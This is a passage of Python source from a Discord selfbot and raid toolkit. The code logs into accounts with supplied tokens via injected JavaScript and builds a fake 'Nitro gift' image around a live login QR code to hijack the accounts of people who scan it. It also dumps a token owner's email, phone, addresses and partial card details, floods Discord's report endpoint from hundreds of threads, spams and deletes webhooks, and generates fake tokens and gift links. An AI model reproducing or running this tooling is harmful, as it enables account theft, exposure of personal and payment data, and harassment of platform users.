                js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
                driver.execute_script(js + f'login("{entertoken}")')
                time.sleep(10)
                if driver.current_url == 'https://discord.com/login':
                    logoprincipal()
                    TokonError(f"Connection Failed")
                    driver.close()
                else:
                    TokonPrint('Connection Succesful')
                    pp()
            login(_token)
            cs()
            launch()

    if cmd == "purgedm":
        if idlog == premium_saveid and premium_status == "exact":
            logoprincipal()
            token = input(f"{TokonInput}Enter Token To PurgeDM : ")
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
                'Authorization': token
            }
            dms = requests.get(
                "https://discord.com/api/v9/users/@me/channels",
                headers=headers
            ).json()
            TokonPrint(f"""DM channels found\n""")
            pp()

            for i in dms:
                TokonPrint(f"""Leaving DM channel with: {', '.join([x['username'] for x in i['recipients']])}""")
                responce = requests.delete(
                    f"https://discord.com/api/v9/channels/{i['id']}",
                    headers=headers
                )
            TokonPrint(f"Finished Purging DMs")
            pp()
            launch()
    if cmd == "unverifytoken":
        g = f"{Fore.BLUE}"
        r = f"{Fore.RESET}"
        if idlog == premium_saveid and premium_status == "exact":
            logoprincipal()
            token = input(f'{TokonInput}Token To Unverify : ')
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            if r.status_code == 200:
                r = requests.post('https://discordapp.com/api/v9/users/@me/relationships', headers={'Authorization': token, 'User-Agent': 'discordbot'}, json={'username': 'disco3', 'discriminator': 8005})
                if r.status_code == 204:
                    TokonPrint(f"Account Unverified ! ( unverify by Tyxer )")
                    TokonPrint(f"Press (enter) to continue")
                    while True:
                        pp()
                        launch()
                    else:
                        TokonError(f"Error !")
                        print(f'{g}[¤] {r}Press (enter) to continue')
                        pp()
                        launch()
        else:
            TokonPrint('You Are Not Premium')
            pp()
            launch()
    if cmd == "massreport":
        token = decode('')
        if idlog == premium_saveid and premium_status == "exact":
            class massreport:
                def __init__(self):
                    logoprincipal()
                    print(
                        f"""{g}[¤] {r}Enter the ID of the server where the message to be reported is located: """)
                    self.GUILD_ID = str(input(f"{TokonInput}Guild ID: """))
                    print(
                        f"""\n{g}[¤] {r}Enter the ID of the channel in which the message to be reported is located: """)
                    self.CHANNEL_ID = str(input(f"{TokonInput}Channel ID: """))
                    print(f"""\n{g}[¤] {r}Enter the ID of the message to be reported: """)
                    self.MESSAGE_ID = str(input(f"{TokonInput}Message ID: """))
                    print(f"""{g}[¤] {r}Choose the reason for the report: """)
                    print(f"""          {g}[1] {r}Illegal content""")
                    print(f"""          {g}[2] {r}Harassment""")
                    print(f"""          {g}[3] {r}Spam or phishing links""")
                    print(f"""          {g}[4] {r}Self-harm""")
                    print(f"""          {g}[5] {r}NSFW content\n""")
                    REASON = input(f"{TokonInput}Choice: """)

                    if REASON == '1':
                        self.REASON = 0
                    elif REASON == '2':
                        self.REASON = 1
                    elif REASON == '3':
                        self.REASON = 2
                    elif REASON == '4':
                        self.REASON = 3
                    elif REASON == '5':
                        self.REASON = 4
                    else:
                        print(f"""      {g}[¤] {r}Your request is invalid !""")
                        time.sleep(2)
                        main()

                    self.RESPONSES = {f"""
                        401: Unauthorized: {g}[¤] {r}Invalid Discord token,
                        Missing Access: {g}[¤] {r}Missing access to channel or guild,
                        You need to verify your account in order to perform this action: {g}[¤] {r}Unverified"""}
                    self.sent = 0
                    self.errors = 0

                def _reporter(self):
                    report = requests.post(
                        'https://discordapp.com/api/v9/report', json={
                            'channel_id': self.CHANNEL_ID,
                            'message_id': self.MESSAGE_ID,
                            'guild_id': self.GUILD_ID,
                            'reason': self.REASON
                        }, headers={
                            'Accept': '*/*',
                            'Accept-Encoding': 'gzip, deflate',
                            'Accept-Language': 'sv-SE',
                            'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
                            'Content-Type': 'application/json',
                            'Authorization': self.TOKEN
                        }
                    )
                    if (status := report.status_code) == 201:
                        self.sent += 1
                        print(f"""{g}[¤] {r}Reported successfully""")
                    elif status in (401, 403):
                        self.errors += 1
                        print(self.RESPONSES[report.json()['message']])
                    else:
                        self.errors += 1
                        print(f"""{g}[¤] {r}Error: {report.text} | Status Code: {status}""")

                def _update_title(self):
                    while True:
                        os.system(f'title [Reporter] - Sent: {self.sent} | Errors: {self.errors}')
                        time.sleep(0.1)

                def _multi_threading(self):
                    threading.Thread(target=self._update_title).start()
                    while True:
                        if threading.active_count() <= 300:
                            time.sleep(1)
                            threading.Thread(target=self._reporter).start()

                def setup(self):
                    recognized = None
                    if os.path.exists(config_json := 'St/Config.json'):
                        with open(config_json, 'r') as f:
                            try:
                                data = json.load(f)
                                self.TOKEN = data['discordToken']
                            except (KeyError, json.decoder.JSONDecodeError):
                                recognized = False
                            else:
                                recognized = True
                    else:
                        recognized = False

                    if not recognized:
                        self.TOKEN = token
                        with open(config_json, 'w') as f:
                            json.dump({'discordToken': self.TOKEN}, f)
                    print()
                    self._multi_threading()
            mr = massreport()
            mr.setup()
        else:
            TokonPrint('You Are Not Premium')
            pp()
            launch()
    if cmd == "tokeninfo":
        def Tokeninfo(token):
            token = decode('')
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            }
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            cc_digits = {
                'american express': '3',
                'visa': '4',
                'mastercard': '5'
            }
            badges = ""
            Discord_Employee = 1
            Partnered_Server_Owner = 2
            HypeSquad_Events = 4
            Bug_Hunter_Level_1 = 8
            House_Bravery = 64
            House_Brilliance = 128
            House_Balance = 256
            Early_Supporter = 512
            Bug_Hunter_Level_2 = 16384
            Early_Verified_Bot_Developer = 131072

            flags = r.json()['flags']
            if (flags == Discord_Employee):
                badges += "Staff, "
            if (flags == Partnered_Server_Owner):
                badges += "Partner, "
            if (flags == HypeSquad_Events):
                badges += "Hypesquad Event, "
            if (flags == Bug_Hunter_Level_1):
                badges += "Green Bughunter, "
            if (flags == House_Bravery):
                badges += "Hypesquad Bravery, "
            if (flags == House_Brilliance):
                badges += "HypeSquad Brillance, "
            if (flags == House_Balance):
                badges += "HypeSquad Balance, "
            if (flags == Early_Supporter):
                badges += "Early Supporter, "
            if (flags == Bug_Hunter_Level_2):
                badges += "Gold BugHunter, "
            if (flags == Early_Verified_Bot_Developer):
                badges += "Verified Bot Developer, "
            if (badges == ""):
                badges = "None"

            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            language = r.json()['locale']
            mfa = r.json()['mfa_enabled']
            avatar_id = r.json()['avatar']
            has_nitro = False
            res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=headers)
            nitro_data = res.json()
            has_nitro = bool(len(nitro_data) > 0)
            avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{avatar_id}.webp'
            creation_date = datetime.utcfromtimestamp(((int(userID) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')

            if has_nitro:
                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                days_left = abs((d2 - d1).days)

            billing_info = []
            for x in requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources',
                                  headers=headers).json():
                y = x['billing_address']
                name = y['name']
                address_1 = y['line_1']
                address_2 = y['line_2']
                city = y['city']
                postal_code = y['postal_code']
                state = y['state']
                country = y['country']
                if x['type'] == 1:
                    cc_brand = x['brand']
                    cc_first = cc_digits.get(cc_brand)
                    cc_last = x['last_4']
                    cc_month = str(x['expires_month'])
                    cc_year = str(x['expires_year'])
                    data = {
                        'Payment Type': 'Credit Card',
                        'Valid': not x['invalid'],
                        'CC Holder Name': name,
                        'CC Brand': cc_brand.title(),
                        'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in
                                             enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                        'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                        'Address 1': address_1,
                        'Address 2': address_2 if address_2 else '',
                        'City': city,
                        'Postal Code': postal_code,
                        'State': state if state else '',
                        'Country': country,
                        'Default Payment': x['default']
                    }
                elif x['type'] == 2:
                    data = {
                        'Payment Type': 'PayPal',
                        'Valid': not x['invalid'],
                        'PayPal Name': name,
                        'PayPal Email': x['email'],
                        'Address 1': address_1,
                        'Address 2': address_2 if address_2 else '',
                        'City': city,
                        'Postal Code': postal_code,
                        'State': state if state else '',
                        'Country': country,
                        'Default Payment': x['default']
                    }
                billing_info.append(data)

            TokonPrint(f'<<────────────{userName}────────────>>')
            TokonPrint(f'User ID         {userID}')
            TokonPrint(f'Created at      {creation_date}')
            TokonPrint(f'Language        {language}')
            TokonPrint(f'Badges          {badges}')
            TokonPrint(f'Avatar URL      {avatar_url if avatar_id else ""}')
            TokonPrint(f'Token           {token}')
            TokonPrint(f'<───────────Security Info───────────>')
            TokonPrint(f'2 Factor        {mfa}')
            TokonPrint(f'Email           {email}')
            TokonPrint(f'Phone number    {phone if phone else ""}')
            TokonPrint(f'<────────────Nitro Info─────────────>')
            TokonPrint(f'Nitro Status    {has_nitro}')
            TokonPrint(f'Expires in      {days_left if has_nitro else "0"} day(s)')
            if len(billing_info) > 0:
                TokonPrint(f"<────────────Billing Info────────────>")
                if len(billing_info) == 1:
                    for x in billing_info:
                        for key, val in x.items():
                            if not val:
                                continue
                            print(
                                f"[{Fore.RED}" + '{:<23}{:<10}{}'.format(key + Fore.RED + Fore.RESET + "]", Fore.RESET,
                                                                         val))
                else:
                    for i, x in enumerate(billing_info):
                        title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                        TokonPrint('' + title)
                        TokonPrint('' + ('=' * len(title)))
                        for j, (key, val) in enumerate(x.items()):
                            if not val or j == 0:
                                continue
                            print(
                                f"[{Fore.RED}" + '{:<23}{:<10}{}'.format(key + Fore.RED + Fore.RESET + "]", Fore.RESET,
                                                                         val))
                        if i < len(billing_info) - 1:
                            print(f'{Fore.RESET}\n')
                print(f'{Fore.RESET}')
        if idlog == premium_saveid and premium_status == "exact":
            rtoken = input(f'{TokonInput}Enter Token : ')
            Tokeninfo(rtoken)
        else:
            TokonPrint('You Are Not Premium')
        pp()
        launch()
    if cmd == "fakeqrcode":
        def fakeqr():
            logoprincipal()
            TokonPrint(f"Disfunction: \n")
            print(f"""
            Do not close the GoogleChrome window or you will not be able to log in\n
            The FakeNitro expires after 1min20, so be quick\n
            """)
            TokonPrint(f"Press ENTER to continue")
            pp()
            options = webdriver.ChromeOptions()
            options.add_experimental_option('excludeSwitches', ['enable-logging'])
            options.add_experimental_option('detach', True)
            driver = webdriver.Chrome(options=options, executable_path=r'St/e6/chromedriver.exe')
            driver.get('https://discord.com/login')
            time.sleep(5)
            page_source = driver.page_source
            soup = bs4(page_source, features='lxml')
            div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
            qr_code = div.find('img')['src']
            file = os.path.join(os.getcwd(), 'St/e3/setup/qr_code.png')
            img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
            with open(file, 'wb') as handler:
                handler.write(img_data)
            discord_login = driver.current_url
            bg = Image.open('St/e3/setup/back.png')
            qrcode = Image.open('St/e3/setup/qr_code.png')
            qrcode = qrcode.resize(size=(127, 127))
            bg.paste(qrcode, (87, 313))
            discord = Image.open('St/e3/setup/discord.png')
            discord = discord.resize(size=(40, 40))
            bg.paste(discord, (130, 355), discord)
            bg.save('Temp/NitroGift.png')
            TokonPrint(f"QR Code has been generated - [Image: Temp/NitroGift.png]")
            pp()
            launch()
        if idlog == premium_saveid and premium_status == "exact":
            fakeqr()
    if cmd == "discord":
        TokonPrint(f"selfbot")
        TokonPrint(f"raidbot")
        TokonPrint(f"webhook")
        TokonPrint(f"gen")
        TokonPrint(f"bot")
        pp()
        launch()
    if cmd == "bot":
        TokonPrint('send')
        TokonPrint('embed')
        pp()
        launch()
    if cmd == "send":
        sendbot = commands.Bot(command_prefix=".")
        logoprincipal()
        TokonPrint(f"Discord Commands = .stop, .send <message>")
        TokonPrint(f"You Must Have a token Bot Valid")

        @sendbot.command()
        @commands.is_owner()
        async def stop(ctx):
            await ctx.bot.logout()
            print(f"{g}{sendbot.user.name} has logged out successfully." + Fore.RESET)

        @sendbot.command()
        async def send(ctx, *message45):
            await ctx.message.delete()
            message45 = " ".join(message45)
            await ctx.send(message45)

        token2 = input(f"{TokonInput}Enter Token Bot Valid : ")
        sendbot.run(token2)
        launch()
    if cmd == "embed":
        embedbot = commands.Bot(command_prefix=".")
        logoprincipal()
        TokonPrint(f"Discord Commands = .stop, .embed <title> <text>")
        TokonPrint(f"You Must Have a Token Bot Valid")
        text1msg = input(f'{TokonInput}Enter The Title Of Embed : ')
        text2msg = input(f'{TokonInput}Enter The Message of Embed : ')

        @embedbot.command()
        @commands.is_owner()
        async def stop(ctx):
            await ctx.bot.logout()
            print(f"{g}{client.user.name} has logged out successfully." + Fore.RESET)

        @embedbot.command(pass_context=True)
        async def embed(ctx, text1msg, text2msg):
            await ctx.message.delete()
            embed = discord.Embed(
                title=text1msg,
                description=text2msg
            )
            await ctx.send(embed=embed)

        token3 = input(Fore.WHITE + """
        ┌┬┐┌─┐┬┌─┌─┐┌┐┌ 
         │ │ │├┴┐├┤ │││
         ┴ └─┘┴ ┴└─┘┘└┘  - - - - > """)

        embedbot.run(token3)
        launch()
    if cmd == "gen":
        TokonPrint('token')
        TokonPrint('vanitylink')
        TokonPrint('nitrolink')
        pp()
        launch()
    if cmd == "token":
        logoprincipal()
        chars = "-abcdefghijklmnopq_rstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"

        ilosc = input(f"{TokonInput}How many tokens to generate: ")
        ilosc = int(ilosc)

        for i in range(ilosc):
            token1 = ""
            token2 = ""

            for c in range(84):
                token1 += random.choice(chars)

            token2 = 'mfa.'

            token1 = str(token1)
            token2 = str(token2)

            token = token2 + token1
            if not os.path.isfile("Temp/tokens.txt"):
                f = open("Temp/tokens.txt", "w+")
                f.close()
            if os.path.isfile("Temp/tokens.txt"):
                with open('Temp/tokens.txt', 'a') as txt:
                    txt.write(token + "\n")
        print(Fore.RESET + f'{g}[¤] {r}Finished !')
        print(Fore.RESET + f'{g}[¤] {r}All Tokens : Temp/tokens.txt ')
        pp()
        launch()
    if cmd == "nitrolink":
        logoprincipal()
        amount = int(input(f'{TokonInput}Amount of nitro codes to generate: '))
        value = 1
        while value <= amount:
            code = "https://discord.gift/" + ('').join(random.choices(string.ascii_letters + string.digits, k=16))
            if not os.path.isfile("Temp/nitrolink.txt"):
                f = open("Temp/nitrolink.txt", "w+")
                f.close()
            if os.path.isfile("Temp/nitrolink.txt"):
                with open('Temp/nitrolink.txt', 'a') as txt:
                    txt.write(code + "\n")
            value += 1
        print(Fore.RESET + f'{g}[¤] {r}Finished !')
        print(Fore.RESET + f'{g}[¤] {r}All Nitro Link : Temp/nitrolink.txt ')
        pp()
        launch()
    if cmd == "vanitylink":
        logoprincipal()
        code = input(f"{TokonInput}Enter The Name Of Vanity Link : ")
        invite = input(f"{TokonInput}Enter The Invite Of Vanity Link (exemple : discord.gg/exemple): ")
        pyperclip.copy(f"** **\n Discord.gg/{code} ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|||||||||||| {invite}")
        TokonPrint(f"The Link Has Been Copied !")
        pp()
        launch()
    if cmd == "webhook":
        TokonPrint('wstatus')
        TokonPrint('wspam')
        TokonPrint('winfo')
        TokonPrint('wkill')
        TokonPrint('wedit')
        pp()
        launch()
    if cmd == "wstatus":
        logoprincipal()
        url = input(f'{TokonInput}Enter the webhook for get status : ')
        logoprincipal()
        code = requests.get(url).status_code
        status = "Online"
        s = requests.get(url).text
        ss = json.loads(s)
        r = ss.get('message')
        if r == "Unknown Webhook":
            status = "Offline"

        print(f'''
        ╔══════╗
        ║ Code ║ {code}
        ╚══════╝

        ╔════════╗
        ║ Status ║ {status}
        ╚════════╝
        ''')
        pp()
        launch()
    if cmd == "winfo":
        logoprincipal()
        url = input(f'{TokonInput}Enter the webhook for get info : ')
        r = requests.get(url).text
        rr = json.loads(r)
        wname = rr.get('name')
        wavatar = rr.get('avatar')
        wtype = rr.get('type')
        wid = rr.get('id')
        wchannelid = rr.get('channel_id')
        wguildid = rr.get('guild_id')
        wapplicationid = rr.get('application_id')
        wtoken = rr.get('token')
        logoprincipal()
        print(f'''{Fore.RESET}
        ╔═══════╗         
        ║ Infos ║ Name : {wname} 
        ╚═══════╝ Avatar : {wavatar}
                  Type : {wtype}
                  Id : {wid}
                  Channel Id : {wchannelid}
                  Guild Id : {wguildid}
                  Application Id : {wapplicationid}
                  Token : {wtoken}

        ''')
        pp()
        launch()
    if cmd == "wedit":
        logoprincipal()
        webhookedit = input(f'{TokonInput}Enter the webhook for edit : ')
        r = requests.get(webhookedit).text
        rr = json.loads(r)
        if not rr.get('code'):
            logoprincipal()
            nameedit = input(f"{g}[¤] {Fore.RESET}Enter The Name : ")
            r = requests.patch(f"{webhookedit}", json={"name": f"{nameedit}"})
        if rr.get('code'):
            logoprincipal()
            TokonPrint('The webhook has been deleted !')
        pp()
        launch()
    if cmd == "wkill":
        logoprincipal()
        webhookDeleteRe = input(f"{TokonInput}Enter The Webhook ~> ")
        time.sleep(0.5)
        os.system(f'curl -X "DELETE" {webhookDeleteRe}')
        time.sleep(0.5)
        TokonPrint(f"Webhook Deleted !")
        pp()
        launch()
    if cmd == "wspam":
        logoprincipal()
        embedlol = {
            "description": "Your Webhook Has Been Spammed",
            "title": "Universe"
        }
        data = {
            "content": ">||@here||<",
            "username": "Universe Spam",
            "avatar_url": f"{urloflogo}",
            "embeds": [
                embedlol
            ],
        }
        delay = float(input(f"{TokonInput}Enter The Delay (Example : 0.5) : "))
        amount = int(input(f'{TokonInput}Amount of messages : '))
        value = 1
        url = input(f"{TokonInput}Webhook : ")
        while value <= amount:
            time.sleep(delay)
            requests.post(url, json=data)
            TokonPrint("Embed Message Sended ")
            value += 1
        launch()
    if cmd == "selfbot":
        if not os.path.isfile("St/e1/cookie2.txt"):
            cs()
            print("""
                    !!! ALERT !!!
                    If you use commands with password,
                    You will need for lifetime
                    a email and a number or your
                    account will be offline
                    """)
            alertmessage = input(f"{g}[¤] Enter 'ok' for accept the prevention : ")
            if alertmessage == "ok":
                f = open("St\e1\cookie2.txt", "w+")
                f.write("nil")
                f.close()
                pass
            if not alertmessage == "ok":
                launch()

        class SELFBOT():
            __version__ = 1

        prefix = config.get('prefix')
        messageofautomessage = config.get('automessage')
        lagallset = "false"


        stream_url = config.get('stream_url')
        tts_language = "en"
        loop = asyncio.get_event_loop()

        m_numbers = [
            ":one:",
            ":two:",
            ":three:",
            ":four:",
            ":five:",
            ":six:"
        ]

        m_offets = [
            (-1, -1),
            (0, -1),
            (1, -1),
            (-1, 0),
            (1, 0),
            (-1, 1),
            (0, 1),
            (1, 1)
        ]

        def startprint():
            g = f"{Fore.BLUE}"
            gg = f"{Fore.BLUE}"
            g_3 = f"{Fore.BLUE}"
            g_4 = f"{Fore.LIGHTBLUE_EX}"
            g_5 = f"{Fore.LIGHTBLUE_EX}"
            g_6 = f"{Fore.LIGHTBLUE_EX}"
            g_7 = f"{Fore.LIGHTBLUE_EX}"
            r = f"{Fore.RESET}"
            l = f"""{r}{g}
                                                                                        
                                                                             
                                   {r}█████  █████           ███                                              
                                   {g}::{r}███  {g}{g}::{r}███           {g}:::                                               
                                    {g}:{r}███   {g}:{r}███ {r}████████  ████ █████ █████ ██████  ████████  █████   ██████ 
                                    {g_3}:{r}███   {g_3}:{r}███{g_3}::{r}███{g_3}::{r}███{g_3}::{r}███{g_3}::{r}███ {g_3}::{r}███ ███{g_3}::{r}███{g_3}::{r}███{g_3}::{r}██████{g_3}::   {r}███{g_3}::{r}███
                                    {g_4}:{r}███   {g_4}:{r}███ {g_4}:{r}███ {g_4}:{r}███ {g_4}:{r}███ {g_4}:{r}███  {g_4}:{r}███{g_4}:{r}███████  {g_4}:{r}███ {g_4}:::::{r}█████ {g_4}:{r}███████ 
                                    {g_5}:{r}███   {g_5}:{r}███ {g_5}:{r}███ {g_5}:{r}███ {g_5}:{r}███ {g_5}::{r}███ ███ {g_5}:{r}███{g_5}:::   :{r}███     {g_5}::::{r}███{g_5}:{r}███{g_5}:::  
                                    {g_6}::{r}████████  ████ ██████████ {g_6}::{r}█████  {g_6}::{r}██████  █████    ██████ {g_6}::{r}██████ 
                                     {g_7}::::::::  :::: ::::::::::   :::::    ::::::  :::::    ::::::   ::::::{Fore.RESET}                             
                                                                         
{r}──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                                                                         
                                                                         
            """
            print(l)
            print(f'''{Fore.RESET}                                                                                                            
        [User] {Tokon.user.name}#{Tokon.user.discriminator}
        [Prefix] {Tokon.command_prefix}
        [Note] Command For help = ;help

        Logs :

        ''')
        def Clear():
            if sys.platform == "linux":
                os.system('clear')
            else:
                os.system('cls')
        Clear()
        def Init():
            try:
                token = decode('')
                Tokon.run(token, bot=False, reconnect=True)
            except discord.errors.LoginFailure:
                TokonError('Failed To Login With Token')
                pp()

        class Login(discord.Client):
            async def on_connect(self):
                guilds = len(self.guilds)
                users = len(self.users)
                print("")
                print(f"Connected to: [{self.user.name}]")
                print(f"Token: {self.http.token}")
                print(f"Guilds: {guilds}")
                print(f"Users: {users}")
                print("-------------------------------")
                await self.logout()

        def async_executor():
            def outer(func):
                @functools.wraps(func)
                def inner(*args, **kwargs):
                    thing = functools.partial(func, *args, **kwargs)
                    return loop.run_in_executor(None, thing)

                return inner

            return outer

        @async_executor()
        def do_tts(message):
            f = io.BytesIO()
            tts = gTTS(text=message.lower(), lang=tts_language)
            tts.write_to_fp(f)
            f.seek(0)
            return f

        def Nitro():
            code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            return f'https://discord.gift/{code}'

        def RandomColor():
            randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
            return randcolor

        def RandString():
            return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))

        colorama.init()

        Tokon.mee6 = False
        Tokon.mee6_channel = None
        Tokon.yui_kiss_user = None
        Tokon.yui_kiss_channel = None
        Tokon.yui_hug_user = None
        Tokon.yui_hug_channel = None
        Tokon.sniped_message_dict = {}
        Tokon.sniped_edited_message_dict = {}
        Tokon.blocked_users = {}
        Tokon.mute = None
        Tokon.silentmute = None
        Tokon.muted_id = [708375470185644133, 235148962103951360, 858765527887249418]
        Tokon.automessage = None

        # Anti Category
        Tokon.antimassdm = False
        # Last Command
        Tokon.lastcommand = None
        # Customization
        Tokon.theme = "ini"
        Tokon.prevent = "ini"
        Tokon.footer = f"tokon.site.xyz/universedoc"
        Tokon.author = f"Universe"
        # Function Theme
        def on_theme(argument):
            if Tokon.theme == "diff":
                final = argument.replace('[', '-').replace(']', '')
                argument = final
            elif Tokon.theme == "fix":
                final = argument.replace('[', '-').replace(']', '')
                argument = final
            elif Tokon.theme == "blor":
                final = argument.replace('-', '[').replace('=', ']')
                argument = final
            else:
                pass
            return argument
        # Remove command
        Tokon.remove_command('help')

        @Tokon.event
        async def on_connect():
            Clear()
            startprint()

        @Tokon.event
        async def on_message_edit(before, after):
            await Tokon.process_commands(after)

        @Tokon.event
        async def on_message(message):
            if Tokon.mute is not None and Tokon.mute.id == message.author.id:
                await message.channel.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ' + '\n' + "**You are Muted | You can't send messages**")
            if Tokon.silentmute is not None and Tokon.silentmute.id == message.author.id:
                await message.channel.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')
            if Tokon.automessage is not None and Tokon.automessage.id == message.author.id:
                messageofautomessage = config.get('automessage')
                await message.channel.send(messageofautomessage)
            cvcord = await Tokon.get_context(message)
            if cvcord.valid:
                TokonPrint(f'Command Executed > {message.content}')
                if f"{Tokon.command_prefix}rep" in message.content:
                    pass
                else:
                    Tokon.lastcommand = message.content
            await Tokon.process_commands(message)

        @Tokon.event
        async def on_message_delete(message):
            if message.author.id == Tokon.user.id:
                return

        @Tokon.event
        async def on_message_edit(before, after):
            if before.author.id == Tokon.user.id:
                return
            if len(Tokon.sniped_edited_message_dict) > 1000:
                Tokon.sniped_edited_message_dict.clear()
            attachments = before.attachments
            if len(attachments) == 0:
                channel_id = before.channel.id
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
                    before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                                    "@\u200bhere") + "\n**AFTER**\n" + str(
                    after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                Tokon.sniped_edited_message_dict.update({channel_id: message_content})
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                channel_id = before.channel.id
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
                Tokon.sniped_edited_message_dict.update({channel_id: message_content})

        @Tokon.command()
        async def adminservers(ctx):
            await ctx.message.delete()
            admins = []
            bots = []
            kicks = []
            bans = []
            for guild in Tokon.guilds:
                if guild.me.guild_permissions.administrator:
                    admins.append(discord.utils.escape_markdown(guild.name))
                if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
                    bots.append(discord.utils.escape_markdown(guild.name))
                if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
                    bans.append(discord.utils.escape_markdown(guild.name))
                if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
                    kicks.append(discord.utils.escape_markdown(guild.name))
            adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
            botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
            banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
            kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
            await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)

        @Tokon.command()
        async def bots(ctx):
            await ctx.message.delete()
            bots = []
            for member in ctx.guild.members:
                if member.bot:
                    bots.append(
                        str(member.name).replace("`", "\`").replace("*", "\*").replace("_",
                                                                                       "\_") + "#" + member.discriminator)
            bottiez = f"**Bots ({len(bots)}):**\n{', '.join(bots)}"
            await ctx.send(bottiez)

        PremiumOnly = "(**Premium**)"


        @Tokon.command()
        async def help(ctx):
            content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  » is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[general]       » general cmds
[account]       » account cmds
[text]          » text cmds
[picture]       » picture cmds    
[fun]           » fun cmds
[bypass]        » bypass
[animation]     » animations
[shortcut]      » shortcuts
[protection]    » protections
[raid]          » raid cmds
[nettools]      » nettools cmds
[customization] » customize bot
[troll]         » troll cmds
[themes]        » themes of bot


[{Tokon.footer}]
```""")
            await ctx.message.delete()
            await ctx.send(content=content)

        @Tokon.command()
        async def general(ctx, category=None):
            if category is None:
                content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  » is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[clearmenu]        » clear bot's menu
[prefix <prefix>]  » the bot prefix
[ping]             » bot latency 
[userinfo <user>]  » infos about the user
[serverinfo <id>]  » infos about the server
[serverpfp]        » icon of the server
[banner]           » banner of the server
[theme <theme>]    » color of commands


[{Tokon.footer}]
```""")
                await ctx.message.delete()
                await ctx.send(content=content)

        @Tokon.command()
        async def account(ctx, category=None):
            if category is None:
                content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  » is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[ghost]                   » Invisible Profil
[setpfp <link>]           » change pfp by link
[hypesquad <hypesquad>]   » change hypesquad
[spoofcon <type> <name>]  » spoof discord connection
[acceptfriends]           » infos about the server
[delfriends]              » icon of the server
[ignorefriends]           » banner of the server
[leavegc]                 » color of commands


[{Tokon.footer}]
```""")
                await ctx.message.delete()
                await ctx.send(content=content)


        @Tokon.command()
